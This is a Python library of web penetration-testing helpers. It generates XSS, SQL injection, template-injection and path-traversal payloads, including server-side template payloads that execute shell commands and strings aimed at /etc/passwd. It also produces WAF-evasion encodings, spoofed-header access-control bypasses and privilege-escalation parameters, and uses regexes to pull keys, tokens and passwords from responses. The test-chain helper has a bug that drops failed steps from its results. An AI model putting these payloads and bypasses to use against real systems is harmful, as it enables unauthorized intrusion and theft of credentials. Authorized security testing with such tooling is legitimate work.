"""
Manual Testing Helpers for Modern Web Applications

Focused on:
- Request manipulation & replay
- Context-aware payload generation
- WAF/Rate limit bypass techniques
- Response analysis & diffing
- Parameter tampering
- Authentication testing
"""

import re
import json
import base64
import urllib.parse
import hashlib
import time
import random
import string
from typing import Dict, Any, List, Optional, Tuple
from .client import make_request


# ============================================================================
# REQUEST MANIPULATION
# ============================================================================

def build_request(
    url: str,
    method: str = "GET",
    headers: Dict = None,
    params: Dict = None,
    data: Any = None,
    cookies: Dict = None,
    content_type: str = None
) -> Dict[str, Any]:
    """
    Build a customizable HTTP request object for manual testing.
    Returns a request config that can be modified before sending.
    """
    request_config = {
        "url": url,
        "method": method.upper(),
        "headers": headers or {},
        "params": params or {},
        "data": data,
        "cookies": cookies or {},
    }
    
    if content_type:
        request_config["headers"]["Content-Type"] = content_type
    
    # Auto-detect content type if data is dict
    if isinstance(data, dict) and "Content-Type" not in request_config["headers"]:
        request_config["headers"]["Content-Type"] = "application/json"
        request_config["data"] = json.dumps(data)
    
    return request_config


def send_request(request_config: Dict) -> Dict[str, Any]:
    """Send a request from a request config object."""
    url = request_config["url"]
    
    # Add query params
    if request_config.get("params"):
        params_str = urllib.parse.urlencode(request_config["params"])
        url = f"{url}{'&' if '?' in url else '?'}{params_str}"
    
    return make_request(
        url=url,
        method=request_config.get("method", "GET"),
        headers=request_config.get("headers"),
        data=request_config.get("data"),
        cookies=request_config.get("cookies"),
        timeout=30
    )


def replay_with_modifications(
    original_request: Dict,
    modifications: Dict
) -> Dict[str, Any]:
    """
    Replay a request with specific modifications.
    
    modifications can include:
    - headers: dict of headers to add/modify
    - params: dict of params to add/modify
    - data: new data or dict of fields to modify
    - method: new HTTP method
    """
    modified = original_request.copy()
    
    if "headers" in modifications:
        modified["headers"] = {**modified.get("headers", {}), **modifications["headers"]}
    
    if "params" in modifications:
        modified["params"] = {**modified.get("params", {}), **modifications["params"]}
    
    if "data" in modifications:
        if isinstance(modifications["data"], dict) and isinstance(modified.get("data"), dict):
            modified["data"] = {**modified["data"], **modifications["data"]}
        else:
            modified["data"] = modifications["data"]
    
    if "method" in modifications:
        modified["method"] = modifications["method"]
    
    return send_request(modified)


# ============================================================================
# PAYLOAD MUTATION
# ============================================================================

def mutate_payload(payload: str, techniques: List[str] = None) -> List[str]:
    """
    Generate payload variations using different mutation techniques.
    
    Techniques:
    - case: Change case variations
    - encode: URL/HTML/Unicode encoding
    - whitespace: Add/modify whitespace
    - comments: Add comments (SQL, HTML, JS)
    - concat: String concatenation
    - double: Double encoding
    - null: Add null bytes
    """
    techniques = techniques or ["case", "encode", "whitespace", "comments"]
    mutations = [payload]  # Original
    
    if "case" in techniques:
        mutations.extend([
            payload.upper(),
            payload.lower(),
            payload.swapcase(),
            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)),
        ])
    
    if "encode" in techniques:
        mutations.extend([
            urllib.parse.quote(payload),
            urllib.parse.quote(payload, safe=''),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            ''.join(f'\\u{ord(c):04x}' for c in payload),
            ''.join(f'%{ord(c):02x}' for c in payload),
        ])
    
    if "whitespace" in techniques:
        mutations.extend([
            payload.replace(' ', '\t'),
            payload.replace(' ', '\n'),
            payload.replace(' ', '/**/'),
            payload.replace(' ', '%20'),
            payload.replace(' ', '+'),
            re.sub(r'\s+', '  ', payload),
        ])
    
    if "comments" in techniques:
        mutations.extend([
            payload.replace(' ', '/**/'),  # SQL
            payload + '<!--',  # HTML
            payload + '//',  # JS
            f"/*{payload}*/",
        ])
    
    if "concat" in techniques:
        # For SQL
        if "'" in payload:
            mutations.append(payload.replace("'", "'+'")),
            mutations.append(payload.replace("'", "'||'")),
        # For JS
        mutations.append(payload.replace('"', '"+""+"')),
    
    if "double" in techniques:
        mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        mutations.append(urllib.parse.quote(payload.replace('<', '&lt;')))
    
    if "null" in techniques:
        mutations.extend([
            payload + '\x00',
            '\x00' + payload,
            payload.replace(' ', '\x00'),
        ])
    
    # Remove duplicates while preserving order
    seen = set()
    unique = []
    for m in mutations:
        if m not in seen:
            seen.add(m)
            unique.append(m)
    
    return unique


def generate_polyglot(vuln_type: str) -> List[str]:
    """Generate polyglot payloads that work across multiple contexts."""
    
    polyglots = {
        "xss": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>",
            "'-alert(1)-'",
            "\"><img src=x onerror=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
        ],
        "sqli": [
            "1' AND '1'='1' UNION SELECT NULL,NULL,NULL--",
            "' OR ''='",
            "1;SELECT * FROM information_schema.tables--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)#",
        ],
        "ssti": [
            "${7*7}{{7*7}}[%7*7%]#{7*7}",
            "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "<%= 7*7 %>${7*7}{{7*7}}",
        ],
        "path_traversal": [
            "....//....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/..\\..\\..\\..\\..\\..\\etc/passwd",
        ],
    }
    
    return polyglots.get(vuln_type, [])


# ============================================================================
# WAF BYPASS TECHNIQUES
# ============================================================================

WAF_BYPASS_HEADERS = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"Fastly-Client-IP": "127.0.0.1"},
    {"X-Azure-ClientIP": "127.0.0.1"},
]

def generate_waf_bypass_payloads(payload: str) -> List[Dict[str, Any]]:
    """Generate payload variations to bypass WAF."""
    bypasses = []
    
    # Encoding bypasses
    encodings = [
        ("url", urllib.parse.quote(payload)),
        ("double_url", urllib.parse.quote(urllib.parse.quote(payload))),
        ("unicode", ''.join(f'\\u{ord(c):04x}' for c in payload)),
        ("hex", ''.join(f'\\x{ord(c):02x}' for c in payload)),
        ("base64", base64.b64encode(payload.encode()).decode()),
        ("html_entity", ''.join(f'&#{ord(c)};' for c in payload)),
    ]
    
    for name, encoded in encodings:
        bypasses.append({"type": name, "payload": encoded})
    
    # Case manipulation
    bypasses.append({"type": "mixed_case", "payload": ''.join(
        c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)
    )})
    
    # Null byte injection
    bypasses.append({"type": "null_byte", "payload": payload + "%00"})
    
    # Newline injection
    bypasses.append({"type": "newline", "payload": payload.replace(' ', '%0a')})
    
    # Tab injection
    bypasses.append({"type": "tab", "payload": payload.replace(' ', '%09')})
    
    # Comment injection (for SQL)
    if any(kw in payload.lower() for kw in ['select', 'union', 'where', 'and', 'or']):
        bypasses.append({"type": "sql_comment", "payload": payload.replace(' ', '/**/')})
        bypasses.append({"type": "sql_inline", "payload": payload.replace(' ', '/*!*/')})
    
    return bypasses


def test_rate_limit(url: str, requests_count: int = 20, delay: float = 0.1) -> Dict[str, Any]:
    """
    Test rate limiting by sending multiple requests.
    Returns info about when/if rate limiting kicks in.
    """
    results = []
    blocked_at = None
    
    for i in range(requests_count):
        start = time.time()
        resp = make_request(url, timeout=10)
        elapsed = time.time() - start
        
        status = resp.get("status_code", 0)
        results.append({
            "request_num": i + 1,
            "status": status,
            "time": elapsed,
        })
        
        # Detect rate limiting
        if status in [429, 503] and blocked_at is None:
            blocked_at = i + 1
        
        time.sleep(delay)
    
    return {
        "total_requests": requests_count,
        "blocked_at_request": blocked_at,
        "rate_limited": blocked_at is not None,
        "results": results,
        "suggestion": f"Rate limit detected at request {blocked_at}" if blocked_at else "No rate limiting detected"
    }


# ============================================================================
# RESPONSE ANALYSIS
# ============================================================================

def diff_responses(resp1: Dict, resp2: Dict) -> Dict[str, Any]:
    """
    Compare two HTTP responses to find differences.
    Useful for detecting parameter impact, auth bypass, etc.
    """
    diffs = {
        "status_changed": resp1.get("status_code") != resp2.get("status_code"),
        "length_changed": resp1.get("body_length", 0) != resp2.get("body_length", 0),
        "headers_changed": [],
        "body_diff_ratio": 0,
    }
    
    # Compare status
    if diffs["status_changed"]:
        diffs["status_diff"] = {
            "before": resp1.get("status_code"),
            "after": resp2.get("status_code")
        }
    
    # Compare length
    if diffs["length_changed"]:
        diffs["length_diff"] = {
            "before": resp1.get("body_length", 0),
            "after": resp2.get("body_length", 0),
            "delta": resp2.get("body_length", 0) - resp1.get("body_length", 0)
        }
    
    # Compare headers
    h1 = resp1.get("headers", {})
    h2 = resp2.get("headers", {})
    
    for key in set(h1.keys()) | set(h2.keys()):
        if h1.get(key) != h2.get(key):
            diffs["headers_changed"].append({
                "header": key,
                "before": h1.get(key),
                "after": h2.get(key)
            })
    
    # Simple body diff ratio (0 = identical, 1 = completely different)
    body1 = resp1.get("body", "")
    body2 = resp2.get("body", "")
    
    if body1 and body2:
        # Simple diff: count different chars
        max_len = max(len(body1), len(body2))
        if max_len > 0:
            diff_count = sum(1 for a, b in zip(body1, body2) if a != b)
            diff_count += abs(len(body1) - len(body2))
            diffs["body_diff_ratio"] = round(diff_count / max_len, 3)
    
    diffs["significant_change"] = (
        diffs["status_changed"] or 
        abs(diffs.get("length_diff", {}).get("delta", 0)) > 100 or
        diffs["body_diff_ratio"] > 0.1
    )
    
    return diffs


def extract_secrets_from_response(response: Dict) -> List[Dict[str, str]]:
    """Extract potential secrets/sensitive data from response."""
    body = response.get("body", "")
    secrets = []
    
    patterns = {
        "api_key": r'["\']?(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})["\']?',
        "bearer_token": r'[Bb]earer\s+([a-zA-Z0-9_\-\.]+)',
        "jwt": r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
        "aws_key": r'AKIA[0-9A-Z]{16}',
        "private_key": r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        "password": r'["\']?password["\']?\s*[:=]\s*["\']?([^"\'>\s]{4,})["\']?',
        "secret": r'["\']?secret["\']?\s*[:=]\s*["\']?([^"\'>\s]{8,})["\']?',
        "connection_string": r'(?:mongodb|mysql|postgres|redis)://[^\s<>"]+',
        "internal_ip": r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
    }
    
    for secret_type, pattern in patterns.items():
        matches = re.findall(pattern, body, re.IGNORECASE)
        for match in matches:
            secrets.append({
                "type": secret_type,
                "value": match if isinstance(match, str) else match[0] if match else "",
                "pattern": pattern
            })
    
    return secrets


def analyze_error_response(response: Dict) -> Dict[str, Any]:
    """Analyze error responses for information disclosure."""
    body = response.get("body", "")
    status = response.get("status_code", 0)
    
    analysis = {
        "status_code": status,
        "error_type": None,
        "stack_trace": False,
        "debug_info": False,
        "database_info": False,
        "path_disclosure": False,
        "version_disclosure": [],
        "findings": []
    }
    
    # Detect stack traces
    stack_patterns = [
        r'Traceback \(most recent call last\)',
        r'at [\w\.]+\([\w\.]+:\d+\)',
        r'Exception in thread',
        r'Fatal error:',
        r'Stack trace:',
    ]
    
    for pattern in stack_patterns:
        if re.search(pattern, body, re.IGNORECASE):
            analysis["stack_trace"] = True
            analysis["findings"].append("Stack trace exposed")
            break
    
    # Detect database errors
    db_patterns = {
        "mysql": [r'mysql', r'mysqli', r'MariaDB'],
        "postgresql": [r'PostgreSQL', r'pg_query', r'psql'],
        "mssql": [r'Microsoft SQL', r'ODBC SQL Server', r'SQLServer'],
        "oracle": [r'ORA-\d{5}', r'Oracle error'],
        "mongodb": [r'MongoDB', r'MongoError'],
    }
    
    for db, patterns in db_patterns.items():
        for pattern in patterns:
            if re.search(pattern, body, re.IGNORECASE):
                analysis["database_info"] = db
                analysis["findings"].append(f"Database type exposed: {db}")
                break
    
    # Detect path disclosure
    path_patterns = [
        r'(?:/var/www/|/home/\w+/|/usr/|C:\\\\|D:\\\\)[^\s<>"\']+',
        r'(?:DocumentRoot|DOCUMENT_ROOT)\s*[:=]\s*[^\s<>"\']+',
    ]
    
    for pattern in path_patterns:
        match = re.search(pattern, body)
        if match:
            analysis["path_disclosure"] = match.group(0)
            analysis["findings"].append(f"Path disclosed: {match.group(0)}")
            break
    
    # Detect version disclosure
    version_patterns = [
        (r'PHP/[\d\.]+', 'PHP'),
        (r'Apache/[\d\.]+', 'Apache'),
        (r'nginx/[\d\.]+', 'nginx'),
        (r'IIS/[\d\.]+', 'IIS'),
        (r'Python/[\d\.]+', 'Python'),
        (r'Node\.js v[\d\.]+', 'Node.js'),
        (r'Ruby/[\d\.]+', 'Ruby'),
    ]
    
    for pattern, tech in version_patterns:
        match = re.search(pattern, body)
        if match:
            analysis["version_disclosure"].append({
                "technology": tech,
                "version": match.group(0)
            })
            analysis["findings"].append(f"Version disclosed: {match.group(0)}")
    
    return analysis


# ============================================================================
# PARAMETER TAMPERING
# ============================================================================

def generate_idor_tests(param_value: str) -> List[Dict[str, Any]]:
    """Generate IDOR test values for a given parameter."""
    tests = []
    
    # Numeric IDOR
    if param_value.isdigit():
        val = int(param_value)
        tests.extend([
            {"type": "decrement", "value": str(val - 1)},
            {"type": "increment", "value": str(val + 1)},
            {"type": "zero", "value": "0"},
            {"type": "negative", "value": str(-val)},
            {"type": "large", "value": str(val * 1000)},
            {"type": "array", "value": f"[{val},{val-1}]"},
        ])
    
    # UUID IDOR
    if re.match(r'^[a-f0-9-]{36}$', param_value, re.IGNORECASE):
        tests.extend([
            {"type": "null_uuid", "value": "00000000-0000-0000-0000-000000000000"},
            {"type": "modified", "value": param_value[:-1] + ('0' if param_value[-1] != '0' else '1')},
        ])
    
    # Base64 encoded
    try:
        decoded = base64.b64decode(param_value).decode()
        if decoded.isdigit():
            val = int(decoded)
            tests.append({
                "type": "b64_modified",
                "value": base64.b64encode(str(val - 1).encode()).decode()
            })
    except:
        pass
    
    # Generic
    tests.extend([
        {"type": "empty", "value": ""},
        {"type": "null", "value": "null"},
        {"type": "admin", "value": "admin"},
        {"type": "wildcard", "value": "*"},
    ])
    
    return tests


def generate_privilege_escalation_tests(user_role: str = "user") -> List[Dict[str, Any]]:
    """Generate tests for privilege escalation."""
    tests = []
    
    # Role manipulation
    role_params = ["role", "user_role", "type", "user_type", "level", "access_level", "permission"]
    admin_values = ["admin", "administrator", "root", "superuser", "1", "true", "yes"]
    
    for param in role_params:
        for value in admin_values:
            tests.append({
                "type": "role_param",
                "param": param,
                "value": value,
                "description": f"Set {param}={value}"
            })
    
    # Hidden params
    hidden_params = [
        {"admin": "true"},
        {"is_admin": "1"},
        {"debug": "true"},
        {"test": "true"},
        {"internal": "true"},
        {"bypass": "true"},
    ]
    
    for param_dict in hidden_params:
        tests.append({
            "type": "hidden_param",
            "params": param_dict,
            "description": f"Add hidden param: {param_dict}"
        })
    
    # JWT claim injection (if applicable)
    jwt_claims = [
        {"role": "admin"},
        {"admin": True},
        {"groups": ["admin"]},
        {"permissions": ["*"]},
    ]
    
    for claim in jwt_claims:
        tests.append({
            "type": "jwt_claim",
            "claim": claim,
            "description": f"Inject JWT claim: {claim}"
        })
    
    return tests


# ============================================================================
# AUTHENTICATION TESTING
# ============================================================================

def generate_auth_bypass_tests(endpoint: str) -> List[Dict[str, Any]]:
    """Generate authentication bypass test cases."""
    tests = []
    
    # Method override
    for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
        tests.append({
            "type": "method_override",
            "method": method,
            "description": f"Try {method} method"
        })
    
    # Path manipulation
    path_variants = [
        endpoint + "/",
        endpoint + "//",
        endpoint + "/.",
        endpoint + "/..;/",
        endpoint + "%2f",
        endpoint + "%252f",
        endpoint.replace("/", "//"),
        endpoint.upper(),
        endpoint + "?",
        endpoint + "#",
        endpoint + ";",
    ]
    
    for path in path_variants:
        tests.append({
            "type": "path_manipulation",
            "path": path,
            "description": f"Access via: {path}"
        })
    
    # Header bypasses
    bypass_headers = [
        {"X-Original-URL": endpoint},
        {"X-Rewrite-URL": endpoint},
        {"X-Override-URL": endpoint},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"Referer": "https://trusted-domain.com"},
        {"Origin": "https://trusted-domain.com"},
    ]
    
    for headers in bypass_headers:
        tests.append({
            "type": "header_bypass",
            "headers": headers,
            "description": f"Bypass with headers: {headers}"
        })
    
    return tests


# ============================================================================
# WORKFLOW HELPERS
# ============================================================================

def create_test_chain(steps: List[Dict]) -> List[Dict[str, Any]]:
    """
    Create a chain of tests that depend on each other.
    
    Each step can reference results from previous steps.
    """
    results = []
    context = {}
    
    for i, step in enumerate(steps):
        step_result = {
            "step": i + 1,
            "name": step.get("name", f"Step {i+1}"),
            "status": "pending",
        }
        
        try:
            # Build request
            request_config = step.get("request", {})
            
            # Replace variables from context
            for key, value in request_config.items():
                if isinstance(value, str) and value.startswith("$"):
                    var_name = value[1:]
                    if var_name in context:
                        request_config[key] = context[var_name]
            
            # Send request
            response = send_request(request_config)
            step_result["response"] = {
                "status": response.get("status_code"),
                "length": response.get("body_length", 0),
            }
            
            # Extract values for next steps
            if "extract" in step:
                for var_name, pattern in step["extract"].items():
                    match = re.search(pattern, response.get("body", ""))
                    if match:
                        context[var_name] = match.group(1) if match.groups() else match.group(0)
            
            # Check conditions
            if "expect" in step:
                expect = step["expect"]
                if "status" in expect:
                    if response.get("status_code") != expect["status"]:
                        step_result["status"] = "failed"
                        step_result["error"] = f"Expected status {expect['status']}, got {response.get('status_code')}"
                        continue
                
                if "contains" in expect:
                    if expect["contains"] not in response.get("body", ""):
                        step_result["status"] = "failed"
                        step_result["error"] = f"Response doesn't contain: {expect['contains']}"
                        continue
            
            step_result["status"] = "passed"
            
        except Exception as e:
            step_result["status"] = "error"
            step_result["error"] = str(e)
        
        results.append(step_result)
    
    return {
        "total_steps": len(steps),
        "passed": sum(1 for r in results if r["status"] == "passed"),
        "failed": sum(1 for r in results if r["status"] == "failed"),
        "results": results,
        "context": context,
    }


def suggest_next_tests(findings: List[Dict]) -> List[str]:
    """Suggest next manual tests based on findings."""
    suggestions = []
    
    for finding in findings:
        vuln_type = finding.get("type", "").lower()
        
        if "xss" in vuln_type:
            suggestions.extend([
                "Try XSS in different contexts (attribute, JS, URL)",
                "Test for DOM-based XSS",
                "Check if CSP can be bypassed",
                "Try XSS via file upload (SVG, HTML)",
            ])
        
        elif "sqli" in vuln_type or "sql" in vuln_type:
            suggestions.extend([
                "Enumerate database version and type",
                "Try UNION-based extraction",
                "Test for blind SQL injection (time-based)",
                "Check for second-order SQL injection",
            ])
        
        elif "ssrf" in vuln_type:
            suggestions.extend([
                "Try accessing cloud metadata endpoints",
                "Test internal network scanning",
                "Check for protocol smuggling (gopher, file)",
                "Try SSRF via PDF generation or webhooks",
            ])
        
        elif "idor" in vuln_type:
            suggestions.extend([
                "Test horizontal privilege escalation",
                "Test vertical privilege escalation",
                "Check for mass assignment vulnerabilities",
                "Try parameter pollution",
            ])
        
        elif "auth" in vuln_type:
            suggestions.extend([
                "Test for session fixation",
                "Check token entropy and predictability",
                "Test password reset flow",
                "Check for OAuth/SAML misconfigurations",
            ])
    
    # Remove duplicates
    return list(dict.fromkeys(suggestions))
